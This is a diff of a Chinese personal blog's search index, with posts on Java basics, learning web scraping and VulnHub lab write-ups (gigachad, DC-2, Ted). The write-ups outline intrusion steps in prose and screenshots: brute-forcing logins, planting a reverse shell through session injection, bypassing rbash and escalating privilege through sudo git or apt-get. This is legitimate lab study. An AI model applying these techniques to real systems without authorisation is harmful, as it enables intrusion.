@@ -1,1019 +1,411 @@
 <?xml version="1.0" encoding="utf-8"?>
-<search>
-  <entry>
-    <title>吞吐信息的巨鲸</title>
-    <url>/2024/03/20/old/%E7%88%AC%E8%99%AB%E4%B9%8B%E6%97%85/</url>
-    <content><![CDATA[<p>想学爬虫了，当前目标是能接单赚米💰</p>
-<h1 id="怎么学？"><a href="#怎么学？" class="headerlink" title="怎么学？"></a>怎么学？</h1><p>大概就是基于实战的学吧，遇到不会的去搜、去理解<br>理想状态是基于真实需求去学，但是我没搜到那种东西，可能这只存在于接单甲方的私聊里</p>
-<p>实战项目来自于：<a href="https://github.com/jiguang123/Web-Spider-and-Data-Analysis">https://github.com/jiguang123/Web-Spider-and-Data-Analysis</a></p>
-<p>我的最终目标是成为互联网吞吐信息的巨鲸</p>
-]]></content>
+<search> 
+  
+  
+    
+    <entry>
+      <title>吞吐信息的巨鲸</title>
+      <link href="/2024/03/20/old/%E7%88%AC%E8%99%AB%E4%B9%8B%E6%97%85/"/>
+      <url>/2024/03/20/old/%E7%88%AC%E8%99%AB%E4%B9%8B%E6%97%85/</url>
+      
+        <content type="html"><![CDATA[<p>想学爬虫了，当前目标是能接单赚米💰</p><h1 id="怎么学？"><a href="#怎么学？" class="headerlink" title="怎么学？"></a>怎么学？</h1><p>大概就是基于实战的学吧，遇到不会的去搜、去理解<br>理想状态是基于真实需求去学，但是我没搜到那种东西，可能这只存在于接单甲方的私聊里</p><p>实战项目来自于：<a href="https://github.com/jiguang123/Web-Spider-and-Data-Analysis">https://github.com/jiguang123/Web-Spider-and-Data-Analysis</a></p><p>我的最终目标是成为互联网吞吐信息的巨鲸</p>]]></content>
+      
+      
       <categories>
-        <category>爬虫之旅</category>
+          
+          <category> 爬虫之旅 </category>
+          
       </categories>
-  </entry>
-  <entry>
-    <title>gigachad:1-writeup</title>
-    <url>/2024/03/09/old/gigachad-1-writeup/</url>
-    <content><![CDATA[<p>靶机地址:<a href="https://www.vulnhub.com/entry/gigachad-1,657/">https://www.vulnhub.com/entry/gigachad-1,657/</a></p>
-<h1 id="要点"><a href="#要点" class="headerlink" title="要点"></a>要点</h1><ol>
-<li>开启的ftp服务是能匿名登录的</li>
-<li>根据ftp里那个的提示，了解了一个username，可以从web上获取一张藏有密码提示的图片</li>
-<li>图片里没有用到隐写，应该去google上搜图</li>
-<li>find可以找到，靶机里有个s-nail-privsec的SUID文件，在exploitdb上找相关的exp就能提权</li>
-</ol>
-<p>文章讲解：<br><a href="https://nepcodex.com/2021/07/gigachad-walkthrough-vulnhub-writeup/">https://nepcodex.com/2021/07/gigachad-walkthrough-vulnhub-writeup/</a><br><a href="https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2017-5899">https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2017-5899</a></p>
-<h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><p><img src="/2024/03/09/old/gigachad-1-writeup/drippinchad.png"><br><img src="/2024/03/09/old/gigachad-1-writeup/flag.png"><br><img src="/2024/03/09/old/gigachad-1-writeup/chad_real_identity.png"></p>
-<h1 id="有趣的东西"><a href="#有趣的东西" class="headerlink" title="有趣的东西"></a>有趣的东西</h1><h2 id="the-real-gigachad"><a href="#the-real-gigachad" class="headerlink" title="the real gigachad"></a>the real gigachad</h2><p>关于靶机根目录里留下的图片，可以获取一下信息：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">演员的维基介绍 https://tr.wikipedia.org/wiki/Sefa_Zengin</span><br><span class="line"></span><br><span class="line">2003-2004 - Kurtlar Vadisi - Erdal Kömürcü</span><br><span class="line"></span><br><span class="line">土耳其惡狼谷 英文名:Valley of the Wolves 土耳其名:Kurtlar Vadisi</span><br><span class="line">Erdal Kömürcü是该系列的一名角色</span><br></pre></td></tr></table></figure>
-<p>大多数是土耳其语，并且目前的翻译软件比较垃圾，又懒得看，就只能给出这点东西了</p>
-<h2 id="rabbit-hole"><a href="#rabbit-hole" class="headerlink" title="rabbit hole"></a>rabbit hole</h2><p>dirsearch 扫描web的时候会冒出来一堆莫名其妙的东西，我也不知道这个叫什么，在 <a href="https://nepcodex.com/2021/07/gigachad-walkthrough-vulnhub-writeup/">https://nepcodex.com/2021/07/gigachad-walkthrough-vulnhub-writeup/</a> 里被叫做兔子洞，但我直接搜会搜到别的东西</p>
-<p><a href="https://rabbithole.gg/">https://rabbithole.gg/</a><br>web3，学不会一点（−＿−；）</p>
-]]></content>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>gigachad:1-writeup</title>
+      <link href="/2024/03/09/old/gigachad-1-writeup/"/>
+      <url>/2024/03/09/old/gigachad-1-writeup/</url>
+      
+        <content type="html"><![CDATA[<p>靶机地址:<a href="https://www.vulnhub.com/entry/gigachad-1,657/">https://www.vulnhub.com/entry/gigachad-1,657/</a></p><h1 id="要点"><a href="#要点" class="headerlink" title="要点"></a>要点</h1><ol><li>开启的ftp服务是能匿名登录的</li><li>根据ftp里那个的提示，了解了一个username，可以从web上获取一张藏有密码提示的图片</li><li>图片里没有用到隐写，应该去google上搜图</li><li>find可以找到，靶机里有个s-nail-privsec的SUID文件，在exploitdb上找相关的exp就能提权</li></ol><p>文章讲解：<br><a href="https://nepcodex.com/2021/07/gigachad-walkthrough-vulnhub-writeup/">https://nepcodex.com/2021/07/gigachad-walkthrough-vulnhub-writeup/</a><br><a href="https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2017-5899">https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2017-5899</a></p><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><p><img src="/2024/03/09/old/gigachad-1-writeup/drippinchad.png"><br><img src="/2024/03/09/old/gigachad-1-writeup/flag.png"><br><img src="/2024/03/09/old/gigachad-1-writeup/chad_real_identity.png"></p><h1 id="有趣的东西"><a href="#有趣的东西" class="headerlink" title="有趣的东西"></a>有趣的东西</h1><h2 id="the-real-gigachad"><a href="#the-real-gigachad" class="headerlink" title="the real gigachad"></a>the real gigachad</h2><p>关于靶机根目录里留下的图片，可以获取一下信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">演员的维基介绍 https://tr.wikipedia.org/wiki/Sefa_Zengin</span><br><span class="line"></span><br><span class="line">2003-2004 - Kurtlar Vadisi - Erdal Kömürcü</span><br><span class="line"></span><br><span class="line">土耳其惡狼谷 英文名:Valley of the Wolves 土耳其名:Kurtlar Vadisi</span><br><span class="line">Erdal Kömürcü是该系列的一名角色</span><br></pre></td></tr></table></figure><p>大多数是土耳其语，并且目前的翻译软件比较垃圾，又懒得看，就只能给出这点东西了</p><h2 id="rabbit-hole"><a href="#rabbit-hole" class="headerlink" title="rabbit hole"></a>rabbit hole</h2><p>dirsearch 扫描web的时候会冒出来一堆莫名其妙的东西，我也不知道这个叫什么，在 <a href="https://nepcodex.com/2021/07/gigachad-walkthrough-vulnhub-writeup/">https://nepcodex.com/2021/07/gigachad-walkthrough-vulnhub-writeup/</a> 里被叫做兔子洞，但我直接搜会搜到别的东西</p><p><a href="https://rabbithole.gg/">https://rabbithole.gg/</a><br>web3，学不会一点（−＿−；）</p>]]></content>
+      
+      
       <categories>
-        <category>网络安全</category>
+          
+          <category> 网络安全 </category>
+          
       </categories>
-      <tags>
-        <tag>🌟</tag>
-        <tag>writeup</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>javadoc</title>
-    <url>/2024/01/30/old/javadoc/</url>
-    <content><![CDATA[<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 文档注释</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>
-
-<p>运行命令，生成文档注释对应的技术文档</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">javadoc 文件名 -d 指定目录</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+        <tags>
+            
+            <tag> 🌟 </tag>
+            
+            <tag> writeup </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>javadoc</title>
+      <link href="/2024/01/30/old/javadoc/"/>
+      <url>/2024/01/30/old/javadoc/</url>
+      
+        <content type="html"><![CDATA[<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 文档注释</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><p>运行命令，生成文档注释对应的技术文档</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javadoc 文件名 -d 指定目录</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
       <categories>
-        <category>java</category>
+          
+          <category> java </category>
+          
       </categories>
-      <tags>
-        <tag>🌟</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>dc-2-writeup</title>
-    <url>/2023/12/24/old/dc-2-writeup/</url>
-    <content><![CDATA[<h1 id="靶机简介"><a href="#靶机简介" class="headerlink" title="靶机简介"></a>靶机简介</h1><blockquote>
-<p>靶机链接： <a href="https://www.vulnhub.com/entry/dc-2,311/">https://www.vulnhub.com/entry/dc-2,311/</a><br>靶机链接： <a href="http://www.five86.com/dc-2.html">http://www.five86.com/dc-2.html</a><br>系列：- <a href="https://www.vulnhub.com/series/dc,199/">DC</a></p>
-</blockquote>
-<p><img src="/2023/12/24/old/dc-2-writeup/-"></p>
-<h1 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h1><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><ol>
-<li>绑定ip和域名</li>
-<li>通过wpscan获取用户名，并用cewl获取密码，制作成两个字典</li>
-<li>msf爆破，得到两个账户</li>
-<li>通过其中一个账户，得到shell</li>
-</ol>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><ol>
-<li>绕过rbash</li>
-<li>尝试切换另一个账户，成功</li>
-<li>sudo -l发现git的委派权限</li>
-<li>git提权</li>
-</ol>
-<h1 id="工具和技术"><a href="#工具和技术" class="headerlink" title="工具和技术"></a>工具和技术</h1><blockquote>
-<p>cewl通过爬虫生成字典<br>rbash绕过</p>
-</blockquote>
-<h1 id="渗透过程及结果"><a href="#渗透过程及结果" class="headerlink" title="渗透过程及结果"></a>渗透过程及结果</h1><p>查看网络<br><img src="/2023/12/24/old/dc-2-writeup/10%E7%BD%91%E7%BB%9C.png"><br>绑定域名和ip<br><img src="/2023/12/24/old/dc-2-writeup/11.png"><br>第一个flag<br><img src="/2023/12/24/old/dc-2-writeup/12flag1.png"><br>制作网站登录爆破字典，爆出账户密码<br><img src="/2023/12/24/old/dc-2-writeup/13user.png"><br><img src="/2023/12/24/old/dc-2-writeup/14password.png"><br><img src="/2023/12/24/old/dc-2-writeup/15brute.png"><br><img src="/2023/12/24/old/dc-2-writeup/16flag2.png"><br>拿shell<br><img src="/2023/12/24/old/dc-2-writeup/17getshell.png"><br>提权<br><img src="/2023/12/24/old/dc-2-writeup/18%E8%83%BD%E6%89%A7%E8%A1%8C%E7%9A%84%E5%91%BD%E4%BB%A4.png"><br><img src="/2023/12/24/old/dc-2-writeup/19flag4.png"><br><img src="/2023/12/24/old/dc-2-writeup/20%E6%9F%A5%E7%9C%8B%E6%9D%83%E9%99%90.png"><br><img src="/2023/12/24/old/dc-2-writeup/21root.png"><br><img src="/2023/12/24/old/dc-2-writeup/22finalflag.png"></p>
-<h1 id="总结反思"><a href="#总结反思" class="headerlink" title="总结反思"></a>总结反思</h1><p>在打DC-2的时候，在最后的提权阶段，感受到了急躁<br>首先就是，在得到了flag2，得到了两个用户和密码的时候，没有去试ssh，而是先去看了writeup<br>然后就是里面cd命令回显rbash的时候，没有首先去搜rbash，而是去看了一眼writeup<br>最后就是，绕过rbash之后，也没有尝试使用su进行用户切换，而是去看了一眼writeup<br>受不了了</p>
-<ol>
-<li>不要放过任何的回显</li>
-<li>尝试每一个账户，在可登录的任何地方</li>
-<li>每每感受到了障碍，就明晰进入下一步可能可以做什么？需要什么信息？当前有什么信息？可以用信息来干嘛？</li>
-</ol>
-<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
-<p><a href="https://gtfobins.github.io/gtfobins/git/#sudo">https://gtfobins.github.io/gtfobins/git/#sudo</a> 提权<br><a href="https://cloud.tencent.com/developer/article/1720937">https://cloud.tencent.com/developer/article/1720937</a> 修改环境变量中的PATH<br><a href="https://www.freebuf.com/articles/system/188989.html">https://www.freebuf.com/articles/system/188989.html</a> rbash绕过</p>
-</blockquote>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> 🌟 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>dc-2-writeup</title>
+      <link href="/2023/12/24/old/dc-2-writeup/"/>
+      <url>/2023/12/24/old/dc-2-writeup/</url>
+      
+        <content type="html"><![CDATA[<h1 id="靶机简介"><a href="#靶机简介" class="headerlink" title="靶机简介"></a>靶机简介</h1><blockquote><p>靶机链接： <a href="https://www.vulnhub.com/entry/dc-2,311/">https://www.vulnhub.com/entry/dc-2,311/</a><br>靶机链接： <a href="http://www.five86.com/dc-2.html">http://www.five86.com/dc-2.html</a><br>系列：- <a href="https://www.vulnhub.com/series/dc,199/">DC</a></p></blockquote><p><img src="/2023/12/24/old/dc-2-writeup/-"></p><h1 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h1><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><ol><li>绑定ip和域名</li><li>通过wpscan获取用户名，并用cewl获取密码，制作成两个字典</li><li>msf爆破，得到两个账户</li><li>通过其中一个账户，得到shell</li></ol><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><ol><li>绕过rbash</li><li>尝试切换另一个账户，成功</li><li>sudo -l发现git的委派权限</li><li>git提权</li></ol><h1 id="工具和技术"><a href="#工具和技术" class="headerlink" title="工具和技术"></a>工具和技术</h1><blockquote><p>cewl通过爬虫生成字典<br>rbash绕过</p></blockquote><h1 id="渗透过程及结果"><a href="#渗透过程及结果" class="headerlink" title="渗透过程及结果"></a>渗透过程及结果</h1><p>查看网络<br><img src="/2023/12/24/old/dc-2-writeup/10%E7%BD%91%E7%BB%9C.png"><br>绑定域名和ip<br><img src="/2023/12/24/old/dc-2-writeup/11.png"><br>第一个flag<br><img src="/2023/12/24/old/dc-2-writeup/12flag1.png"><br>制作网站登录爆破字典，爆出账户密码<br><img src="/2023/12/24/old/dc-2-writeup/13user.png"><br><img src="/2023/12/24/old/dc-2-writeup/14password.png"><br><img src="/2023/12/24/old/dc-2-writeup/15brute.png"><br><img src="/2023/12/24/old/dc-2-writeup/16flag2.png"><br>拿shell<br><img src="/2023/12/24/old/dc-2-writeup/17getshell.png"><br>提权<br><img src="/2023/12/24/old/dc-2-writeup/18%E8%83%BD%E6%89%A7%E8%A1%8C%E7%9A%84%E5%91%BD%E4%BB%A4.png"><br><img src="/2023/12/24/old/dc-2-writeup/19flag4.png"><br><img src="/2023/12/24/old/dc-2-writeup/20%E6%9F%A5%E7%9C%8B%E6%9D%83%E9%99%90.png"><br><img src="/2023/12/24/old/dc-2-writeup/21root.png"><br><img src="/2023/12/24/old/dc-2-writeup/22finalflag.png"></p><h1 id="总结反思"><a href="#总结反思" class="headerlink" title="总结反思"></a>总结反思</h1><p>在打DC-2的时候，在最后的提权阶段，感受到了急躁<br>首先就是，在得到了flag2，得到了两个用户和密码的时候，没有去试ssh，而是先去看了writeup<br>然后就是里面cd命令回显rbash的时候，没有首先去搜rbash，而是去看了一眼writeup<br>最后就是，绕过rbash之后，也没有尝试使用su进行用户切换，而是去看了一眼writeup<br>受不了了</p><ol><li>不要放过任何的回显</li><li>尝试每一个账户，在可登录的任何地方</li><li>每每感受到了障碍，就明晰进入下一步可能可以做什么？需要什么信息？当前有什么信息？可以用信息来干嘛？</li></ol><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote><p><a href="https://gtfobins.github.io/gtfobins/git/#sudo">https://gtfobins.github.io/gtfobins/git/#sudo</a> 提权<br><a href="https://cloud.tencent.com/developer/article/1720937">https://cloud.tencent.com/developer/article/1720937</a> 修改环境变量中的PATH<br><a href="https://www.freebuf.com/articles/system/188989.html">https://www.freebuf.com/articles/system/188989.html</a> rbash绕过</p></blockquote>]]></content>
+      
+      
       <categories>
-        <category>网络安全</category>
+          
+          <category> 网络安全 </category>
+          
       </categories>
-      <tags>
-        <tag>🌟</tag>
-        <tag>writeup</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Hello-World-powered-by-Java</title>
-    <url>/2023/12/21/old/Hello-World-powered-by-Java/</url>
-    <content><![CDATA[<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hello</span> &#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">		<span class="comment">// 生成一些简单的输出</span></span><br><span class="line">		System.out.println(<span class="string">&quot;Hello, World!&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这是一个java代码，很明显能看出这是输出Hello, World的程序<br>但是，我们需要看懂<br>什么是看懂：</p>
-<ol>
-<li>知道对程序每个单词的称呼</li>
-<li>知道程序每个单词的功能</li>
-<li>知道单词与单词结合后的功能</li>
-<li>知道如何运行程序</li>
-<li>知道运行程序所需要的环境</li>
-</ol>
-<span id="more"></span>
-
-<h1 id="解析每个单词"><a href="#解析每个单词" class="headerlink" title="解析每个单词"></a>解析每个单词</h1><p><code>public</code>是访问修饰符之一，提供了最大的可访问性<br><code>class</code> 是用来定义类的关键字<br><code>Hello</code>和<code>main</code>是标识符，用于称呼自己+{}包含的所有内容，其基本的符号结构与“一切”这个词一样<br><code>Hello</code>是一个公共类<br>一个Java源文件中只能有一个公共类，并且该类的名称必须与文件名相同<br>对该程序进行编译将生成对应的.class文件</p>
-<p><code>main</code>是一个特殊的方法名，是程序的入口点<br>而程序的入口点，必须定义在公共类中，并且必须有这样的签名</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static void main(String[] args)</span><br></pre></td></tr></table></figure>
-<p><code>static</code> 是一个关键字，用于修饰类的成员（字段和方法），以及内部类<br>有</p>
-<ol>
-<li>静态字段</li>
-<li>静态方法</li>
-<li>静态块</li>
-<li>静态内部类<br><code>void</code>代表main的返回值是没有<br><code>String[] args</code>是main的参数列表，接受运行java程序时调用的命令行参数<br><code>System</code>是Java的内置类，位于java.lang类库中，其中包含了一些基本的类和接口，它们被隐式导入到每个Java源文件中<br><code>out</code>是一个对象，类型为PrintStream<br><code>println</code>：是<code>PrintStream</code>类的一个方法，用于打印输出并在行末尾添加换行符。</li>
-</ol>
-<h1 id="如何运行程序"><a href="#如何运行程序" class="headerlink" title="如何运行程序"></a>如何运行程序</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javac 1.java;java 1</span><br></pre></td></tr></table></figure>
-<p>javac编译程序源代码，生成名称相同的.class字节码<br>java运行.class文件，通过制定类名来解释执行对应的类</p>
-<h1 id="程序环境"><a href="#程序环境" class="headerlink" title="程序环境"></a>程序环境</h1><h2 id="开发环境"><a href="#开发环境" class="headerlink" title="开发环境"></a>开发环境</h2><p>JDK（Java Development Kit）是Java开发工具包的缩写，是Java开发人员进行Java应用程序开发的核心工具。它包含了编译器、运行时环境（JRE）、调试器、开发工具和类库等组件。</p>
-<h2 id="运行环境"><a href="#运行环境" class="headerlink" title="运行环境"></a>运行环境</h2><p>JRE是Java程序的运行时环境。JRE包含了Java虚拟机（JVM）和运行所需的类库等组件，用于执行Java程序</p>
-<h2 id="虚拟机"><a href="#虚拟机" class="headerlink" title="虚拟机"></a>虚拟机</h2><p>JVM（Java Virtual Machine）是Java虚拟机的缩写，它是Java平台的核心组件之一。JVM是一个虚拟计算机，可以在物理计算机上模拟执行Java字节码（由Java编译器生成的中间代码），使得Java程序具有跨平台的特性。</p>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol>
-<li>java是一个面向对象的语言</li>
-<li>可以看出，java即进行了编译，又进行了解释</li>
-</ol>
-<h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><p>什么是面向对象，类、接口、方法、成员、对象分别都是什么？<br>java有哪些常用的库？</p>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> 🌟 </tag>
+            
+            <tag> writeup </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Hello-World-powered-by-Java</title>
+      <link href="/2023/12/21/old/Hello-World-powered-by-Java/"/>
+      <url>/2023/12/21/old/Hello-World-powered-by-Java/</url>
+      
+        <content type="html"><![CDATA[<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hello</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="comment">// 生成一些简单的输出</span></span><br><span class="line">System.out.println(<span class="string">&quot;Hello, World!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是一个java代码，很明显能看出这是输出Hello, World的程序<br>但是，我们需要看懂<br>什么是看懂：</p><ol><li>知道对程序每个单词的称呼</li><li>知道程序每个单词的功能</li><li>知道单词与单词结合后的功能</li><li>知道如何运行程序</li><li>知道运行程序所需要的环境</li></ol><span id="more"></span><h1 id="解析每个单词"><a href="#解析每个单词" class="headerlink" title="解析每个单词"></a>解析每个单词</h1><p><code>public</code>是访问修饰符之一，提供了最大的可访问性<br><code>class</code> 是用来定义类的关键字<br><code>Hello</code>和<code>main</code>是标识符，用于称呼自己+{}包含的所有内容，其基本的符号结构与“一切”这个词一样<br><code>Hello</code>是一个公共类<br>一个Java源文件中只能有一个公共类，并且该类的名称必须与文件名相同<br>对该程序进行编译将生成对应的.class文件</p><p><code>main</code>是一个特殊的方法名，是程序的入口点<br>而程序的入口点，必须定义在公共类中，并且必须有这样的签名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args)</span><br></pre></td></tr></table></figure><p><code>static</code> 是一个关键字，用于修饰类的成员（字段和方法），以及内部类<br>有</p><ol><li>静态字段</li><li>静态方法</li><li>静态块</li><li>静态内部类<br><code>void</code>代表main的返回值是没有<br><code>String[] args</code>是main的参数列表，接受运行java程序时调用的命令行参数<br><code>System</code>是Java的内置类，位于java.lang类库中，其中包含了一些基本的类和接口，它们被隐式导入到每个Java源文件中<br><code>out</code>是一个对象，类型为PrintStream<br><code>println</code>：是<code>PrintStream</code>类的一个方法，用于打印输出并在行末尾添加换行符。</li></ol><h1 id="如何运行程序"><a href="#如何运行程序" class="headerlink" title="如何运行程序"></a>如何运行程序</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac 1.java;java 1</span><br></pre></td></tr></table></figure><p>javac编译程序源代码，生成名称相同的.class字节码<br>java运行.class文件，通过制定类名来解释执行对应的类</p><h1 id="程序环境"><a href="#程序环境" class="headerlink" title="程序环境"></a>程序环境</h1><h2 id="开发环境"><a href="#开发环境" class="headerlink" title="开发环境"></a>开发环境</h2><p>JDK（Java Development Kit）是Java开发工具包的缩写，是Java开发人员进行Java应用程序开发的核心工具。它包含了编译器、运行时环境（JRE）、调试器、开发工具和类库等组件。</p><h2 id="运行环境"><a href="#运行环境" class="headerlink" title="运行环境"></a>运行环境</h2><p>JRE是Java程序的运行时环境。JRE包含了Java虚拟机（JVM）和运行所需的类库等组件，用于执行Java程序</p><h2 id="虚拟机"><a href="#虚拟机" class="headerlink" title="虚拟机"></a>虚拟机</h2><p>JVM（Java Virtual Machine）是Java虚拟机的缩写，它是Java平台的核心组件之一。JVM是一个虚拟计算机，可以在物理计算机上模拟执行Java字节码（由Java编译器生成的中间代码），使得Java程序具有跨平台的特性。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol><li>java是一个面向对象的语言</li><li>可以看出，java即进行了编译，又进行了解释</li></ol><h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><p>什么是面向对象，类、接口、方法、成员、对象分别都是什么？<br>java有哪些常用的库？</p>]]></content>
+      
+      
       <categories>
-        <category>java</category>
+          
+          <category> java </category>
+          
       </categories>
-      <tags>
-        <tag>🌟</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Ted:1 writeup</title>
-    <url>/2023/12/17/old/Ted-1-writeup/</url>
-    <content><![CDATA[<h1 id="靶机简介"><a href="#靶机简介" class="headerlink" title="靶机简介"></a>靶机简介</h1><blockquote>
-<p>靶机链接： <a href="https://www.vulnhub.com/entry/ted-1,327/">https://www.vulnhub.com/entry/ted-1,327/</a></p>
-</blockquote>
-<span id="more"></span>
-<h1 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h1><h2 id="拿shell"><a href="#拿shell" class="headerlink" title="拿shell"></a>拿shell</h2><ol>
-<li>http进去时登录验证界面</li>
-<li>用户名密码都好猜的要死，但是密码正确后要提示转成hash，使出来时sha256:英文字母大写</li>
-<li>进去后是一个文件包含的页面</li>
-<li>通过session注入的方式注入一句话反弹shell，然后再包含，得到shell</li>
-<li>session注入方式，是注入user_pref键，注入内容需全部转成urlencode形式</li>
-</ol>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><ol>
-<li>sudo -l 发现能以root权限无密码执行apt-get命令，以此提权</li>
-</ol>
-<h1 id="工具和技术"><a href="#工具和技术" class="headerlink" title="工具和技术"></a>工具和技术</h1><blockquote>
-<p><a href="https://tool.oschina.net/encrypt?type=2">https://tool.oschina.net/encrypt?type=2</a> hash加密<br><a href="https://www.iamwawa.cn/daxiaoxie.html">https://www.iamwawa.cn/daxiaoxie.html</a> 英文大小写转换</p>
-</blockquote>
-<h1 id="渗透过程及结果"><a href="#渗透过程及结果" class="headerlink" title="渗透过程及结果"></a>渗透过程及结果</h1><p>网络<br><img src="/2023/12/17/old/Ted-1-writeup/1%E7%BD%91%E7%BB%9C.png"><br>查看web页面<br><img src="/2023/12/17/old/Ted-1-writeup/11%E4%B8%BB%E9%A1%B5.png"><br><img src="/2023/12/17/old/Ted-1-writeup/12%E8%AE%A4%E8%AF%81%E9%A1%B5%E9%9D%A2.png"><br>制作字典并爆破<br><img src="/2023/12/17/old/Ted-1-writeup/13%E5%AD%97%E5%85%B8.png"><br><img src="/2023/12/17/old/Ted-1-writeup/14.png"><br><img src="/2023/12/17/old/Ted-1-writeup/15.png"><br><img src="/2023/12/17/old/Ted-1-writeup/16%E6%88%90%E5%8A%9F.png"><br>撕开口子拿shell<br><img src="/2023/12/17/old/Ted-1-writeup/17session%E6%B3%A8%E5%85%A5.png"><br><img src="/2023/12/17/old/Ted-1-writeup/18fantanshell%E8%AF%AD%E5%8F%A5.png"><br><img src="/2023/12/17/old/Ted-1-writeup/19%E6%8B%BF%E5%88%B0shell.png"><br>提权<br><img src="/2023/12/17/old/Ted-1-writeup/20%E6%8F%90%E6%9D%83.png"></p>
-<h1 id="总结反思"><a href="#总结反思" class="headerlink" title="总结反思"></a>总结反思</h1><ol>
-<li>靶机真短</li>
-<li>不过session注入是一个非常好的思路</li>
-<li>user_pref什么的，还有sudo-l只执行apt-get太刻意了</li>
-</ol>
-<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
-<p>学校资料<br><a href="https://ab-alex.github.io/2019/06/11/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">https://ab-alex.github.io/2019/06/11/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</a> session路径参考<br><a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a> 提权方式参考</p>
-</blockquote>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> 🌟 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Ted:1 writeup</title>
+      <link href="/2023/12/17/old/Ted-1-writeup/"/>
+      <url>/2023/12/17/old/Ted-1-writeup/</url>
+      
